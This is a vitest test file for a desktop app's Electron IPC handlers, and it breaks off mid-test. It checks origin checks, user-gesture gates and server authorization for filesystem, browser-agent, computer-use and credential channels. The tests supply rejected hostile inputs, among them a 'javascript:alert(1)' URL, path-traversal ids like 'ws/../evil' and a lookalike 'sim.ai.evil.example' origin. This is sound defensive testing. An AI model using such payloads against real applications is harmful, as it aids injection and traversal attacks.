import { EventEmitter } from 'node:events'
import { mkdtempSync, readFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { PASTE_LIMITS } from '@sim/utils/paste'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

vi.mock('electron', () => import('@/test/electron-mock'))

// Stubbed so the gating tests never read the developer's real Chrome profile
// or reach their Keychain — the importer's own behaviour is covered by
// src/main/browser-import.
vi.mock('@/main/browser-import', () => ({
  isChromeImportSupported: vi.fn(() => true),
  listChromeImportProfiles: vi.fn(async () => [{ id: 'Default', label: 'Person 1' }]),
  importChromeCookies: vi.fn(async () => ({ cookiesImported: 3, cookiesSkipped: 1 })),
  importChromePasswords: vi.fn(async () => ({
    passwordsAdded: 2,
    passwordsUpdated: 0,
    passwordsSkipped: 1,
  })),
}))

vi.mock('@/main/browser-search/suggestions', () => ({
  getSearchSuggestions: vi.fn(async () => ['sim ai workflow']),
}))

const { terminalThemeProfile } = vi.hoisted(() => ({
  terminalThemeProfile: {
    id: 'iterm2:ocean',
    name: 'Ocean',
    source: 'iterm2' as const,
    palette: {
      background: '#101010',
      foreground: '#f0f0f0',
      cursor: '#ffffff',
      selectionBackground: '#264f78',
      black: '#000000',
      red: '#cc0000',
      green: '#00cc00',
      yellow: '#cccc00',
      blue: '#0000cc',
      magenta: '#cc00cc',
      cyan: '#00cccc',
      white: '#cccccc',
      brightBlack: '#555555',
      brightRed: '#ff5555',
      brightGreen: '#55ff55',
      brightYellow: '#ffff55',
      brightBlue: '#5555ff',
      brightMagenta: '#ff55ff',
      brightCyan: '#55ffff',
      brightWhite: '#ffffff',
    },
  },
}))

vi.mock('@/main/terminal-themes', () => ({
  findCachedTerminalThemeProfile: vi.fn((profileId: string) =>
    profileId === terminalThemeProfile.id ? terminalThemeProfile : null
  ),
  listTerminalThemeProfiles: vi.fn(async () => [terminalThemeProfile]),
}))

const { mockCoordinator } = vi.hoisted(() => ({
  mockCoordinator: {
    noteFormState: vi.fn(),
    noteFillResult: vi.fn(),
    requestPicker: vi.fn(async () => {}),
    noteNavigation: vi.fn(),
    forget: vi.fn(),
    refreshAvailability: vi.fn(),
    showChooser: vi.fn(async () => true),
    listFillOptions: vi.fn(async () => [
      {
        id: 'c1',
        origin: 'https://example.com',
        username: 'ada',
        createdAt: '',
        updatedAt: '',
        source: 'chrome',
      },
    ]),
    fillCredential: vi.fn(async () => true),
  },
}))

vi.mock('@/main/browser-credentials', () => ({
  revealCredential: vi.fn(async () => 'hunter2'),
  copyCredential: vi.fn(async () => true),
  credentialsAvailable: vi.fn(() => true),
  listCredentials: vi.fn(async () => [
    {
      id: 'c1',
      origin: 'https://example.com',
      username: 'ada',
      createdAt: '',
      updatedAt: '',
      source: 'chrome',
    },
  ]),
  forgetCredential: vi.fn(async () => []),
  forgetAllCredentials: vi.fn(async () => []),
  clearCredentials: vi.fn(async () => {}),
  initFillCoordinator: vi.fn(() => mockCoordinator),
  fillCoordinator: vi.fn(() => mockCoordinator),
}))

// A browser tab is identified by WebContents, not by URL — the pages it hosts
// are arbitrary websites.
vi.mock('@/main/browser-agent/registry', () => ({
  registerAgentWebContents: vi.fn(),
  isAgentWebContents: vi.fn(
    (contents: { isBrowserTab?: boolean } | null) => contents?.isBrowserTab === true
  ),
}))

import type { ComputerUseAppPermission, DesktopPreferences } from '@sim/desktop-bridge'
import type { ComputerUseResult } from '@sim/desktop-bridge/computer-use'
import type { WebContents } from 'electron'
import { clipboard, ipcMain, shell } from 'electron'
import * as browserDriver from '@/main/browser-agent/driver'
import * as browserSession from '@/main/browser-agent/session'
import {
  copyCredential,
  credentialsAvailable,
  forgetAllCredentials,
  forgetCredential,
  listCredentials,
  revealCredential,
} from '@/main/browser-credentials'
import {
  importChromeCookies,
  importChromePasswords,
  listChromeImportProfiles,
} from '@/main/browser-import'
import { getSearchSuggestions } from '@/main/browser-search/suggestions'
import { ComputerUseService } from '@/main/computer-use/service'
import { createConfigStore } from '@/main/config'
import { trackInputActivity } from '@/main/input-activity'
import { type IpcDeps, registerIpcHandlers } from '@/main/ipc'
import { LocalFilesystemService } from '@/main/local-filesystem'
import { isLocalPageUrl } from '@/main/local-pages'
import { TerminalRegistry } from '@/main/terminal/registry'
import { findCachedTerminalThemeProfile, listTerminalThemeProfiles } from '@/main/terminal-themes'

const APP = 'https://sim.ai'
const ESC = '\u001b'
const BEL = '\u0007'
const CANONICAL_BROWSER_URL_INPUT =
  'HTTPS://B\u00dcCHER.Example:443/docs/../private?query=sim#result'
const CANONICAL_BROWSER_URL = 'https://xn--bcher-kva.example/private?query=sim#result'
const INVALID_BROWSER_URLS = [
  'https://[',
  'file:///tmp/private',
  `https://docs.example/${'a'.repeat(8_192)}`,
  `https://docs.example/${'\u00e9'.repeat(1_400)}`,
] as const

const DEFAULT_DESKTOP_PREFERENCES: DesktopPreferences = {
  notificationsEnabled: true,
  notificationSounds: true,
  notificationsOnlyWhenUnfocused: true,
  launchAtLogin: false,
  autoDownloadUpdates: true,
  trayEnabled: true,
  browserEnabled: true,
  terminalEnabled: true,
  browserTheme: 'app',
  browserDefaultZoom: 100,
  browserDownloadDirectory: '/tmp/downloads',
  terminalTheme: 'app',
  terminalDefaultZoom: 100,
}

type InputListener = (event: unknown, input: { type: string }) => void

interface FakeSender {
  session?: { fetch: (url: string, init?: RequestInit) => Promise<Response> }
  /** Marks a sender the mocked registry recognises as a browser tab. */
  isBrowserTab?: boolean
  isDestroyed?: () => boolean
  on?: (channel: string, listener: InputListener) => void
}

type Handler = (
  event: {
    senderFrame: { url: string; executeJavaScript?: (source: string) => Promise<unknown> } | null
    sender?: FakeSender
  },
  ...args: unknown[]
) => unknown

function collectHandlers() {
  const invoke = new Map<string, Handler>()
  const on = new Map<string, Handler>()
  for (const [channel, handler] of vi.mocked(ipcMain.handle).mock.calls) {
    invoke.set(channel as string, handler as Handler)
  }
  for (const [channel, handler] of vi.mocked(ipcMain.on).mock.calls) {
    on.set(channel as string, handler as Handler)
  }
  return { invoke, on }
}

/**
 * A sender registered with the main-process input tracker, so a test can grant
 * it a real gesture with `press`. User activation is no longer read out of the
 * renderer, so a fixture cannot fake it by stubbing `executeJavaScript`.
 */
function trackedSender() {
  const listeners: InputListener[] = []
  const sender = {
    session: {
      fetch: vi.fn(async () => {
        throw new Error('not authorized')
      }),
    },
    isDestroyed: () => false,
    on: (channel: string, listener: InputListener) => {
      if (channel === 'input-event') listeners.push(listener)
    },
  }
  trackInputActivity(sender as unknown as WebContents)
  return {
    sender,
    /** Delivers one real click, satisfying both input-recency gates. */
    press: () => {
      for (const listener of listeners) listener({}, { type: 'mouseDown' })
    },
  }
}

const rejectedSender = () => trackedSender().sender
const localPageSender = rejectedSender()
const appSender = rejectedSender()
const evilSender = rejectedSender()
const activeSender = trackedSender()
const activeChooserSender = trackedSender()
const localPageEvent = {
  senderFrame: { url: 'sim-shell://pages/offline.html?kind=dns&detail=probe' },
  sender: localPageSender,
}
const appEvent = { senderFrame: { url: `${APP}/workspace/ws1` }, sender: appSender }
const activeAppEvent = {
  senderFrame: { url: `${APP}/workspace/ws1` },
  sender: activeSender.sender,
}
/** Same origin, but the main process has never seen this renderer get input. */
const inactiveAppEvent = {
  senderFrame: { url: `${APP}/workspace/ws1` },
  sender: rejectedSender(),
}
const evilEvent = { senderFrame: { url: 'https://evil.example/page' }, sender: evilSender }
const _arbitraryFileEvent = {
  senderFrame: { url: 'file:///Users/example/private.html' },
  sender: localPageSender,
}
/** The chooser anchors a native menu, so it needs a sender with a window. */
const FAKE_WINDOW = { id: 'main-window' }
const _activeChooserEvent = {
  senderFrame: { url: `${APP}/workspace/ws1` },
  sender: activeChooserSender.sender,
}

describe('registerIpcHandlers', () => {
  let deps: IpcDeps
  const computerRoots: string[] = []

  beforeEach(() => {
    // Frozen so the input-recency windows cannot lapse mid-test: the gates read
    // wall-clock, and a loaded machine pausing between this press and an
    // assertion would flip them closed for reasons unrelated to the test.
    vi.useFakeTimers()
    activeSender.press()
    activeChooserSender.press()
    vi.mocked(ipcMain.handle).mockClear()
    vi.mocked(ipcMain.on).mockClear()
    vi.mocked(shell.openExternal).mockClear()
    vi.mocked(listChromeImportProfiles).mockClear()
    vi.mocked(importChromeCookies).mockClear()
    vi.mocked(importChromePasswords).mockClear()
    vi.mocked(getSearchSuggestions).mockClear()
    vi.mocked(findCachedTerminalThemeProfile).mockClear()
    vi.mocked(listTerminalThemeProfiles).mockClear()
    vi.mocked(credentialsAvailable).mockClear()
    vi.mocked(listCredentials).mockClear()
    vi.mocked(forgetCredential).mockClear()
    vi.mocked(forgetAllCredentials).mockClear()
    vi.mocked(revealCredential).mockClear()
    vi.mocked(copyCredential).mockClear()
    mockCoordinator.noteFormState.mockClear()
    mockCoordinator.showChooser.mockClear()
    mockCoordinator.listFillOptions.mockClear()
    mockCoordinator.fillCredential.mockClear()
    deps = {
      appOrigin: () => APP,
      allowHttpLocalhost: () => false,
      accountDataAvailable: () => true,
      isLocalPageUrl,
      retryLoad: vi.fn(),
      beginOAuthConnect: vi.fn(async () => true),
      localFilesystem: new LocalFilesystemService({
        chooseDirectory: vi.fn(async () => null),
      }),
      terminal: new TerminalRegistry(),
      scopeEvents: {
        activateBrowser: vi.fn(),
        activateTerminal: vi.fn(),
        sendBrowser: vi.fn(),
        sendTerminal: vi.fn(),
      },
      settings: {
        getPreferences: vi.fn(() => DEFAULT_DESKTOP_PREFERENCES),
        setPreference: vi.fn(),
        setBrowserSearchSuggestionsEnabled: vi.fn(),
        setAppearancePreference: vi.fn(),
        setBrowserDefaultZoom: vi.fn(),
        setTerminalDefaultZoom: vi.fn(),
        selectTerminalProfile: vi.fn(),
        chooseBrowserDownloadDirectory: vi.fn(async () => DEFAULT_DESKTOP_PREFERENCES),
        notify: vi.fn(() => true),
        applySystemPreferences: vi.fn(),
      },
      getWindowState: vi.fn(() => ({ isFullScreen: true })),
      getWindowForContents: vi.fn(() => FAKE_WINDOW as never),
      browserPanel: {
        activateScope: vi.fn(),
        setBounds: vi.fn(),
        setFocused: vi.fn(),
        captureSnapshot: vi.fn(async () => ({
          dataUrl: 'data:image/png;base64,c2lt',
          tabId: 'tab-1',
          zoomPercent: 100,
          scopeId: 'chat-a',
        })),
        setOccluded: vi.fn(() => true),
      },
      updates: {
        getState: vi.fn(() => ({ status: 'ready' as const, version: '1.2.3' })),
        check: vi.fn(),
        install: vi.fn(),
      },
      server: {
        open: vi.fn(),
        getConfiguration: vi.fn(() => ({ origin: APP, defaultOrigin: APP, isSimCloud: true })),
        setOrigin: vi.fn(async () => ({ ok: true as const, origin: APP, unchanged: true })),
      },
    }
    registerIpcHandlers(deps)
  })

  afterEach(() => {
    vi.useRealTimers()
    for (const root of computerRoots.splice(0)) rmSync(root, { recursive: true, force: true })
  })

  it('opens validated external URLs only after recent user input', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('desktop:open-external')
    const activeUntrustedEvent = {
      senderFrame: evilEvent.senderFrame,
      sender: activeSender.sender,
    }

    expect(await handler?.(evilEvent, 'https://docs.sim.ai')).toBe(false)
    expect(await handler?.(activeUntrustedEvent, 'https://docs.sim.ai')).toBe(true)
    expect(await handler?.(activeAppEvent, 'javascript:alert(1)')).toBe(false)
    expect(await handler?.(activeAppEvent, 42)).toBe(false)
    expect(shell.openExternal).toHaveBeenCalledTimes(1)
  })

  it('opens microphone privacy settings only for an activated trusted app origin', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('desktop:open-microphone-settings')

    expect(await handler?.(evilEvent)).toBe(false)
    expect(await handler?.(appEvent)).toBe(false)
    expect(await handler?.(activeAppEvent)).toBe(process.platform === 'darwin')
    expect(shell.openExternal).toHaveBeenCalledTimes(process.platform === 'darwin' ? 1 : 0)
  })

  it('restricts the OAuth connect handoff to an activated app origin', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('desktop:oauth-connect')
    expect(await handler?.(evilEvent, 'slack')).toBe(false)
    expect(await handler?.(localPageEvent, 'slack')).toBe(false)
    expect(await handler?.(appEvent, 'slack')).toBe(false)
    expect(deps.beginOAuthConnect).not.toHaveBeenCalled()
    expect(await handler?.(activeAppEvent, 42)).toBe(false)
    expect(await handler?.(activeAppEvent, 'slack')).toBe(true)
    expect(deps.beginOAuthConnect).toHaveBeenCalledWith('slack', {})

    // Connects carry workspace/credential or exact-draft scope; malformed
    // scopes (wrong types, unsafe ids) are rejected before the handoff.
    expect(
      await handler?.(activeAppEvent, 'slack', {
        workspaceId: 'ws1',
        credentialId: 'cred_1',
        draftId: 'draft_1',
        chatAttemptId: 'attempt_1',
      })
    ).toBe(true)
    expect(deps.beginOAuthConnect).toHaveBeenCalledWith('slack', {
      workspaceId: 'ws1',
      credentialId: 'cred_1',
      draftId: 'draft_1',
      chatAttemptId: 'attempt_1',
    })
    expect(await handler?.(activeAppEvent, 'slack', { workspaceId: 'ws/../evil' })).toBe(false)
    expect(await handler?.(activeAppEvent, 'slack', { draftId: '../wrong' })).toBe(false)
    expect(await handler?.(activeAppEvent, 'slack', { chatAttemptId: '../wrong' })).toBe(false)
    expect(await handler?.(activeAppEvent, 'slack', 'not-an-object')).toBe(false)
  })

  it('restricts local filesystem access to the app origin', async () => {
    const { invoke } = collectHandlers()
    expect(
      await invoke.get('desktop:local-filesystem')?.(evilEvent, { operation: 'list_mounts' })
    ).toMatchObject({ ok: false, code: 'ACCESS_DENIED' })
    expect(
      await invoke.get('desktop:local-filesystem')?.(appEvent, { operation: 'list_mounts' })
    ).toEqual({ ok: true, data: { mounts: [] } })
  })

  it('gates account-bearing browser, terminal, and filesystem APIs during recovery', async () => {
    deps.accountDataAvailable = () => false
    const { invoke } = collectHandlers()
    const localFilesystemHandle = vi.spyOn(deps.localFilesystem, 'handle')
    const terminalRestore = vi.spyOn(deps.terminal, 'restoreScope')

    await expect(
      invoke.get('desktop:local-filesystem')?.(appEvent, { operation: 'list_mounts' })
    ).resolves.toMatchObject({ ok: false, code: 'ACCESS_DENIED' })
    await expect(invoke.get('browser-credentials:list')?.(appEvent)).resolves.toEqual([])
    await expect(invoke.get('terminal:restore-scope')?.(appEvent, 'chat-a')).resolves.toEqual({
      tabs: [],
      activeTerminalId: null,
    })

    expect(localFilesystemHandle).not.toHaveBeenCalled()
    expect(listCredentials).not.toHaveBeenCalled()
    expect(terminalRestore).not.toHaveBeenCalled()
  })

  it('requires an active user gesture for granting or revoking folder access', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('desktop:local-filesystem')

    expect(await handler?.(inactiveAppEvent, { operation: 'mount_directory' })).toMatchObject({
      ok: false,
      code: 'ACCESS_DENIED',
      error: expect.stringContaining('explicit user click'),
    })
    expect(await handler?.(activeAppEvent, { operation: 'mount_directory' })).toMatchObject({
      ok: true,
      data: { cancelled: true, mount: null },
    })
    expect(
      await handler?.(inactiveAppEvent, { operation: 'reveal_mount', uri: 'localfs://mount-1/' })
    ).toMatchObject({
      ok: false,
      code: 'ACCESS_DENIED',
      error: expect.stringContaining('explicit user click'),
    })
  })

  it('reads a native file through canonical IPC arguments without folder grants or user activation', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('desktop:local-files')
    const path = fileURLToPath(import.meta.url)
    const fetchAuthorization = vi.fn(async () =>
      Response.json({ chatId: 'chat-1', toolName: 'read_local_file', args: { path, limit: 64 } })
    )
    const authorizedEvent = {
      senderFrame: { url: `${APP}/o/org/home` },
      sender: { session: { fetch: fetchAuthorization } },
    }
    const mounts = vi.spyOn(deps.localFilesystem, 'handle')
    expect(
      await handler?.(authorizedEvent, {
        operation: 'read',
        toolCallId: 'tool-native',
        path: '/not/the/canonical/path',
      })
    ).toMatchObject({
      ok: true,
      data: { kind: 'read', path, text: readFileSync(path, 'utf8').slice(0, 64) },
    })
    expect(mounts).not.toHaveBeenCalled()
    expect(fetchAuthorization).toHaveBeenCalledWith(
      `${APP}/api/desktop/tool/authorize`,
      expect.objectContaining({ body: JSON.stringify({ toolCallId: 'tool-native' }) })
    )
    expect(
      await handler?.(evilEvent, { operation: 'read', toolCallId: 'tool-native' })
    ).toMatchObject({ ok: false })
  })

  it('claims native imports at IPC before traversal and rejects a replay', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('desktop:local-files')
    const fetchAuthorization = vi
      .fn()
      .mockResolvedValueOnce(
        Response.json({
          chatId: 'chat-1',
          toolName: 'import_local_files',
          args: { path: fileURLToPath(import.meta.url), targetWorkspaceId: 'workspace' },
        })
      )
      .mockResolvedValueOnce(Response.json({ error: 'already started' }, { status: 409 }))
    const event = {
      senderFrame: { url: `${APP}/o/org/home` },
      sender: { session: { fetch: fetchAuthorization } },
    }
    const request = { operation: 'manifest', toolCallId: 'tool-import' }
    expect(await handler?.(event, request)).toMatchObject({
      ok: true,
      data: {
        kind: 'manifest',
        targetWorkspaceId: 'workspace',
        entries: [{ relativePath: '', kind: 'file' }],
      },
    })
    expect(fetchAuthorization).toHaveBeenCalledWith(
      `${APP}/api/desktop/tool/authorize`,
      expect.objectContaining({ body: JSON.stringify({ toolCallId: 'tool-import', claim: true }) })
    )
    expect(await handler?.(event, request)).toMatchObject({ ok: false, code: 'ALREADY_STARTED' })
  })

  it('requires server authorization for every privileged filesystem tool request', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('desktop:local-filesystem')
    const handle = vi.spyOn(deps.localFilesystem, 'handle')

    expect(
      await handler?.(appEvent, {
        operation: 'read',
        uri: 'localfs://mount-1/README.md',
        requestId: 'tool-1',
      })
    ).toMatchObject({
      ok: false,
      code: 'ACCESS_DENIED',
      error: expect.stringContaining('authorized pending Copilot tool call'),
    })
    expect(handle).not.toHaveBeenCalled()

    const fetchAuthorization = vi.fn(async () =>
      Response.json({
        chatId: 'chat-1',
        toolName: 'read',
        args: { path: 'user-local/Project--mount-1/README.md' },
      })
    )
    const authorizedEvent = {
      senderFrame: { url: `${APP}/workspace/ws1` },
      sender: { session: { fetch: fetchAuthorization } },
    }
    vi.spyOn(deps.localFilesystem, 'isAuthorizedClientToolRequest').mockReturnValueOnce(true)
    handle.mockResolvedValueOnce({ ok: true, data: { forgotten: false } })

    await expect(
      handler?.(authorizedEvent, {
        operation: 'read',
        uri: 'localfs://mount-1/README.md',
        requestId: 'tool-1',
      })
    ).resolves.toEqual({ ok: true, data: { forgotten: false } })
    expect(fetchAuthorization).toHaveBeenCalledWith(
      `${APP}/api/desktop/tool/authorize`,
      expect.objectContaining({
        method: 'POST',
        credentials: 'include',
        body: JSON.stringify({ toolCallId: 'tool-1' }),
      })
    )
  })

  it('registers every channel the preload bridge invokes or sends', () => {
    // The two files share ~20 channel names as bare string literals with
    // nothing tying them together, so a typo on either side is a silently dead
    // feature that type-checks, lints, and ships.
    const { invoke, on } = collectHandlers()
    const registered = new Set([...invoke.keys(), ...on.keys()])
    const preloadSource = readFileSync(
      fileURLToPath(new URL('../preload/index.ts', import.meta.url)),
      'utf8'
    )
    const used = [
      ...new Set(
        [...preloadSource.matchAll(/ipcRenderer\.(?:invoke|send)\(\s*'([^']+)'/g)].map(
          (match) => match[1]
        )
      ),
    ]

    expect(used.length).toBeGreaterThan(0)
    expect(used.filter((channel) => !registered.has(channel))).toEqual([])
  })

  it('compares the sender by parsed origin, not by prefix', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('desktop:settings:get')

    // A lookalike host is a prefix of the app origin, so a `startsWith` gate
    // is one missing trailing slash away from admitting it.
    const lookalike = { senderFrame: { url: `${APP}.evil.example/workspace/ws1` } }
    expect(await handler?.(lookalike)).toBeNull()

    // Origin equality also normalizes the default port, which a prefix
    // comparison rejects even though it is the same origin.
    const explicitPort = { senderFrame: { url: 'https://sim.ai:443/workspace/ws1' } }
    expect(await handler?.(explicitPort)).toMatchObject({ notificationsEnabled: true })
  })

  function computerFixture() {
    const root = mkdtempSync(join(tmpdir(), 'computer-ipc-'))
    computerRoots.push(root)
    const config = createConfigStore(join(root, 'settings.json'))
    config.set('computerUseEnabled', true)
    const status: ComputerUseResult = {
      kind: 'status',
      platform: 'darwin',
      accessibility: true,
      screenRecording: true,
    }
    const native = {
      request: vi.fn(
        async (method: string): Promise<ComputerUseResult> =>
          method === 'list_apps' ? { kind: 'apps', apps: [] } : status
      ),
      stop: vi.fn(),
    }
    const approveApp = vi.fn(
      async (_app: ComputerUseAppPermission, _signal: AbortSignal): Promise<'once' | 'deny'> =>
        'once'
    )
    const service = new ComputerUseService({
      config,
      native,
      supported: true,
      approveApp,
      onActivity: vi.fn(),
    })
    deps.computerUse = service
    const cancel = vi.spyOn(service, 'cancel')
    const execute = collectHandlers().invoke.get('computer-use:execute-tool')!
    return { native, approveApp, status, cancel, execute }
  }

  function computerSender(fetch: (url: string, init?: RequestInit) => Promise<Response>) {
    const sender = Object.assign(new EventEmitter(), {
      session: { fetch },
      isDestroyed: () => false,
    })
    return { sender, senderFrame: { url: `${APP}/workspace/ws1` } }
  }

  function computerAuthorization(args: Record<string, unknown> = { action: 'status' }) {
    return Response.json({ chatId: 'computer-chat', toolName: 'computer', args })
  }

  function expectComputerListenersRemoved(sender: EventEmitter) {
    for (const event of ['destroyed', 'render-process-gone', 'did-start-navigation'])
      expect(sender.listenerCount(event)).toBe(0)
  }

  it.each(['destroyed', 'render-process-gone', 'did-start-navigation'])(
    'cancels authorization pending on owning renderer %s',
    async (eventName) => {
      const { native, cancel, execute } = computerFixture()
      let finishAuthorization: (response: Response) => void = () => {}
      const owner = computerSender(
        vi.fn(
          () =>
            new Promise<Response>((resolve) => {
              finishAuthorization = resolve
            })
        )
      )
      const pending = execute(owner, 'owner-tool', { action: 'status' })
      const rejected = expect(pending).rejects.toThrow('stopped')
      owner.sender.emit(eventName, {}, `${APP}/reload`, false, true)
      owner.sender.emit('destroyed')
      expect(cancel).toHaveBeenCalledExactlyOnceWith('owner-tool')
      finishAuthorization(computerAuthorization())
      await rejected
      expect(native.request).not.toHaveBeenCalled()
      expectComputerListenersRemoved(owner.sender)
    }
  )

  it.each(['destroyed', 'render-process-gone', 'did-start-navigation'])(
    'stops native work on owning renderer %s',
    async (eventName) => {
      const { native, cancel, execute } = computerFixture()
      let rejectNative: (error: Error) => void = () => {}
      native.request.mockImplementation(
        () =>
          new Promise<ComputerUseResult>((_resolve, reject) => {
            rejectNative = reject
          })
      )
      native.stop.mockImplementation(() => rejectNative(new Error('native stopped')))
      const owner = computerSender(vi.fn(async () => computerAuthorization()))
      const pending = execute(owner, 'active-tool', { action: 'status' })
      const rejected = expect(pending).rejects.toThrow('stopped')
      await vi.waitFor(() => expect(native.request).toHaveBeenCalledOnce())
      owner.sender.emit(eventName, {}, `${APP}/reload`, false, true)
      owner.sender.emit('destroyed')
      await rejected
      expect(cancel).toHaveBeenCalledExactlyOnceWith('active-tool')
      expect(native.stop).toHaveBeenCalledOnce()
      expectComputerListenersRemoved(owner.sender)
    }
  )

  it('aborts the app approval when its renderer crashes', async () => {
    const { native, approveApp, execute } = computerFixture()
    approveApp.mockImplementation(
      (_app, signal) =>
        new Promise((resolve) => {
          signal.addEventListener('abort', () => resolve('deny'), { once: true })
        })
    )
    const owner = computerSender(
      vi.fn(async () =>
        computerAuthorization({
          action: 'activate_app',
          bundleId: 'com.example.Fixture',
        })
      )
    )
    const pending = execute(owner, 'approval-tool', { action: 'status' })
    const rejected = expect(pending).rejects.toThrow('stopped')
    await vi.waitFor(() => expect(approveApp).toHaveBeenCalledOnce())
    owner.sender.emit('render-process-gone')
    await rejected
    expect(native.request.mock.calls.map(([method]) => method)).toEqual(['list_apps'])
    expectComputerListenersRemoved(owner.sender)
  })

  it('canceling another renderer admission leaves the active owner running', async () => {
    const { native, status, cancel, execute } = computerFixture()
    let finishNative: (result: ComputerUseResult) => void = () => {}
    native.request.mockImplementation(
      () =>
        new Promise<ComputerUseResult>((resolve) => {
          finishNative = resolve
        })
    )
    const owner = computerSender(vi.fn(async () => computerAuthorization()))
    const active = execute(owner, 'active-tool', { action: 'status' })
    await vi.waitFor(() => expect(native.request).toHaveBeenCalledOnce())
    let finishAuthorization: (response: Response) => void = () => {}
    const other = computerSender(
      vi.fn(
        () =>
          new Promise<Response>((resolve) => {
            finishAuthorization = resolve
          })
      )
    )
    const pending = execute(other, 'other-tool', { action: 'status' })
    const rejected = expect(pending).rejects.toThrow('stopped')
    other.sender.emit('render-process-gone')
    expect(cancel).toHaveBeenCalledExactlyOnceWith('other-tool')
    expect(native.stop).not.toHaveBeenCalled()
    finishAuthorization(computerAuthorization())
    await rejected
    finishNative(status)
    await expect(active).resolves.toEqual(status)
    expect(native.request).toHaveBeenCalledOnce()
    expectComputerListenersRemoved(owner.sender)
    expectComputerListenersRemoved(other.sender)
  })

  it('keeps native work through SPA/subframe navigation and releases listeners on success', async () => {
    const { native, status, cancel, execute } = computerFixture()
    let finishNative: (result: ComputerUseResult) => void = () => {}
    native.request.mockImplementation(
      () =>
        new Promise<ComputerUseResult>((resolve) => {
          finishNative = resolve
        })
    )
    const owner = computerSender(vi.fn(async () => computerAuthorization()))
    const pending = execute(owner, 'navigation-tool', { action: 'status' })
    await vi.waitFor(() => expect(native.request).toHaveBeenCalledOnce())
    owner.sender.emit('did-start-navigation', {}, `${APP}/another-chat`, true, true)
    owner.sender.emit('did-start-navigation', {}, 'https://example.com', false, false)
    expect(cancel).not.toHaveBeenCalled()
    finishNative(status)
    await expect(pending).resolves.toEqual(status)
    expectComputerListenersRemoved(owner.sender)
    owner.sender.emit('destroyed')
    expect(cancel).not.toHaveBeenCalled()
  })

  it('releases owner listeners after authorization failure', async () => {
    const { native, cancel, execute } = computerFixture()
    const owner = computerSender(vi.fn(async () => new Response(null, { status: 403 })))
    await expect(execute(owner, 'denied-tool', { action: 'status' })).rejects.toThrow('authorized')
    expectComputerListenersRemoved(owner.sender)
    owner.sender.emit('render-process-gone')
    expect(cancel).not.toHaveBeenCalled()
    expect(native.request).not.toHaveBeenCalled()
  })

  it('restricts browser-agent tool execution to the app origin and known tools', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('browser-agent:execute-tool')

    expect(
      await handler?.(evilEvent, 'tool-1', 'browser_navigate', { url: 'https://x.dev' })
    ).toMatchObject({
      ok: false,
      error: expect.stringContaining('not allowed'),
    })
    expect(await handler?.(localPageEvent, 'tool-1', 'browser_navigate', {})).toMatchObject({
      ok: false,
    })
    expect(await handler?.(appEvent, 'tool-1', 'browser_snapshot', {}, 'chat-1')).toMatchObject({
      ok: false,
      error: expect.stringContaining('authorized pending Copilot tool call'),
    })

    const fetchAuthorization = vi.fn(async () =>
      Response.json({ chatId: 'chat-1', toolName: 'browser_snapshot', args: {} })
    )
    const authorizedEvent = {
      senderFrame: { url: `${APP}/workspace/ws1` },
      sender: { session: { fetch: fetchAuthorization } },
    }
    // The server-persisted name must match the renderer's requested name.
    expect(
      await handler?.(
        authorizedEvent,
        'tool-1',
        'browser_navigate',
        {
          url: 'https://evil.example',
        },
        'chat-1'
      )
    ).toMatchObject({
      ok: false,
      error: expect.stringContaining('authorized pending Copilot tool call'),
    })
    // An authorized call reaches the driver with the server-persisted args
    // (which reports its own tool-level failure because no session exists).
    expect(
      await handler?.(
        authorizedEvent,
        'tool-1',
        'browser_snapshot',
        {
          ignored: 'renderer cannot choose params',
        },
        'chat-1'
      )
    ).toMatchObject({
      ok: false,
      error: expect.stringContaining('No page is open yet'),
    })
    expect(fetchAuthorization).toHaveBeenCalledWith(
      `${APP}/api/desktop/tool/authorize`,
      expect.objectContaining({ body: JSON.stringify({ toolCallId: 'tool-1' }) })
    )
  })

  it('rejects malformed browser execution envelopes before admission or authorization', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('browser-agent:execute-tool')
    const fetchAuthorization = vi.fn(async () =>
      Response.json({ chatId: 'chat-1', toolName: 'browser_snapshot', args: {} })
    )
    const malformedEvent = {
      senderFrame: { url: `${APP}/workspace/ws1` },
      sender: { session: { fetch: fetchAuthorization } },
    }
    const captureBoundary = vi.spyOn(browserDriver, 'captureBrowserToolQueueBoundary')
    const invalidScopeFlood = Array.from(
      { length: browserDriver.BROWSER_TOOL_ADMISSION_LIMITS.process * 2 },
      (_, index) =>
        handler?.(malformedEvent, `tool-${index}`, 'browser_snapshot', {}, `invalid scope ${index}`)
    )

    const results = await Promise.all([
      ...invalidScopeFlood,
      handler?.(malformedEvent, '', 'browser_snapshot', {}, 'chat-1'),
      handler?.(malformedEvent, 'x'.repeat(257), 'browser_snapshot', {}, 'chat-1'),
      handler?.(malformedEvent, 'tool-retired', 'browser_request_takeover', {}, 'chat-1'),
      handler?.(malformedEvent, 'tool-non-string', 42, {}, 'chat-1'),
    ])

    expect(results).toHaveLength(browserDriver.BROWSER_TOOL_ADMISSION_LIMITS.process * 2 + 4)
    expect(results).toEqual(
      results.map(() => ({
        ok: false,
        error: 'This browser action is not an authorized pending Copilot tool call.',
      }))
    )
    expect(captureBoundary).not.toHaveBeenCalled()
    expect(fetchAuthorization).not.toHaveBeenCalled()
    captureBoundary.mockRestore()
  })

  it('rejects browser tools whose server authorization exceeds its execution budget', async () => {
    const { invoke } = collectHandlers()
    const executeTool = vi.spyOn(browserDriver, 'executeTool')
    const authorizationController = new AbortController()
    const timeout = vi.spyOn(AbortSignal, 'timeout').mockReturnValue(authorizationController.signal)
    const fetchAuthorization = vi.fn((_url: string, request?: RequestInit) => {
      const signal = request?.signal
      return new Promise<Response>((_resolve, reject) => {
        signal?.addEventListener('abort', () => reject(signal.reason), { once: true })
      })
    })
    const delayedEvent = {
      senderFrame: { url: `${APP}/workspace/ws1` },
      sender: { session: { fetch: fetchAuthorization } },
    }

    const execution = invoke.get('browser-agent:execute-tool')?.(
